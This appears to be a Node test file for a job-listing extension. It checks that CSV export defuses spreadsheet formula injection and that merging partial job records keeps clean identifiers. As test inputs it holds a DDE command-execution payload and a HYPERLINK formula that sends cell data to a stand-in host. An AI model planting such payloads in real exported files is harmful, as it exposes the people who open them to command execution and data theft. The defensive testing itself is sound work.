/**
 * The extension writes CSVs that get imported into Google Sheets, and merges
 * partial jobs into the same table the Python CLI writes to. Both of those had
 * a defect the Python side had already fixed, so the two halves disagreed.
 */
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, describe, it } from "node:test";
import { pathToFileURL } from "node:url";

import { build } from "esbuild";

const outDir = mkdtempSync(join(tmpdir(), "jh-export-"));
after(() => rmSync(outDir, { recursive: true, force: true }));

async function load(entry) {
  const outfile = join(outDir, `${entry.replace(/\W/g, "_")}.mjs`);
  await build({
    entryPoints: [`app/src/${entry}`],
    outfile,
    bundle: true,
    format: "esm",
    platform: "neutral",
    logLevel: "silent",
  });
  return import(pathToFileURL(outfile).href);
}

describe("CSV export does not hand the spreadsheet a formula", async () => {
  const { toCSV } = await load("lib/export.ts");
  const { emptyJob } = await load("lib/schema.ts");

  function cellsFor(job) {
    const csv = toCSV([{ ...emptyJob(), ...job }]);
    // Row 1 is the header; strip the BOM and the surrounding quotes.
    const row = csv.split("\r\n")[1];
    return row.split('","').map((cell) => cell.replace(/^﻿?"|"$/g, ""));
  }

  it("defuses a DDE payload", () => {
    const cells = cellsFor({ title: "=cmd|' /C calc'!A0" });
    assert.ok(
      cells.some((cell) => cell === "'=cmd|' /C calc'!A0"),
      `expected the value to be prefixed, got ${JSON.stringify(cells.slice(0, 4))}`,
    );
    assert.ok(!cells.some((cell) => cell.startsWith("=")));
  });

  it("defuses a HYPERLINK exfiltration", () => {
    const cells = cellsFor({ company: '=HYPERLINK("https://evil.example/?d="&A1,"Click")' });
    assert.ok(!cells.some((cell) => cell.startsWith("=")));
  });

  it("leaves a European phone number readable", () => {
    const cells = cellsFor({ recruiter_phone: "+41 44 123 45 67" });
    assert.ok(
      cells.includes("+41 44 123 45 67"),
      "a leading + on a plain number is arithmetic notation, not a formula",
    );
  });

  it("defuses a + that is not a number", () => {
    const cells = cellsFor({ title: "+cmd|' /C calc'!A0" });
    assert.ok(!cells.some((cell) => cell.startsWith("+")));
  });

  it("still escapes quotes and flattens newlines", () => {
    const csv = toCSV([{ ...emptyJob(), description: 'a "quoted" line\nsecond line' }]);
    assert.ok(csv.includes('a ""quoted"" line second line'));
    assert.equal(csv.split("\r\n").length, 2, "a newline in a field must not add a row");
  });
});

describe("mergeJobs does not let prose overwrite an identifier", async () => {
  const { mergeJobs, FIRST_WINS_FIELDS } = await load("lib/schema.ts");

  it("keeps the first ISO date rather than the longest string", () => {
    const merged = mergeJobs([
      { posted_date: "2026-09-01" },
      { posted_date: "Veröffentlicht am 1. September 2026" },
    ]);
    assert.equal(merged.posted_date, "2026-09-01");
  });

  it("keeps the first clean apply URL rather than a longer tracking-laden one", () => {
    const merged = mergeJobs([
      { apply_url: "https://acme.de/jobs/1" },
      { apply_url: "https://acme.de/jobs/1?utm_source=newsletter&utm_campaign=q3" },
    ]);
    assert.equal(merged.apply_url, "https://acme.de/jobs/1");
  });

  it("keeps the parsed salary rather than the formatted range", () => {
    const merged = mergeJobs([{ salary_min: "45000" }, { salary_min: "45.000 - 60.000 EUR p.a." }]);
    assert.equal(merged.salary_min, "45000");
  });

  it("still prefers the longer text for prose", () => {
    const merged = mergeJobs([
      { description: "short snippet" },
      { description: "a considerably longer full description of the role" },
    ]);
    assert.equal(merged.description, "a considerably longer full description of the role");
  });

  it("fills an empty first-wins field from a later part", () => {
    const merged = mergeJobs([{ title: "Dev" }, { posted_date: "2026-09-01" }]);
    assert.equal(merged.posted_date, "2026-09-01");
  });

  it("agrees with the Python side about which fields are first-wins", () => {
    for (const field of ["posted_date", "apply_url", "salary_min", "recruiter_email", "source_ats"]) {
      assert.ok(FIRST_WINS_FIELDS.has(field), field);
    }
    assert.ok(!FIRST_WINS_FIELDS.has("description"));
    assert.ok(!FIRST_WINS_FIELDS.has("title"));
  });
});
